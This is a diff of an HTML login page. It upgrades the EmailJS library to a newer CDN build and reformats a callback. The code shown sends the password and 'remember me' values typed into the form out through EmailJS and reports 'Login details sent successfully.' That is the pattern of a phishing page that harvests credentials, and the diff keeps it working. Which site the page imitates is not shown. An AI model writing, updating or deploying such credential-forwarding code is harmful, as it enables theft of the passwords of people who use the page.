@@ -143,10 +143,13 @@
             text-decoration: underline;
         }
     </style>
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-    <script>
-        (function(){
-            emailjs.init("37lBkEtJDx7E4SIUq"); // Replace with your EmailJS user ID
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init({
+                publicKey: "37lBkEtJDx7E4SIUq",
+            });
         })();
     </script>
 </head>
@@ -227,13 +230,13 @@
                     password: password,
                     remember_me: rememberMe
                 })
-                .then(function(response) {
-                    console.log('SUCCESS!', response.status, response.text);
-                    alert('Login details sent successfully.');
-                }, function(error) {
-                    console.log('FAILED...', error);
-                    alert('Failed to send login details.');
-                });
+                    .then(function (response) {
+                        console.log('SUCCESS!', response.status, response.text);
+                        alert('Login details sent successfully.');
+                    }, function (error) {
+                        console.log('FAILED...', error);
+                        alert('Failed to send login details.');
+                    });
             });
         });
     </script>
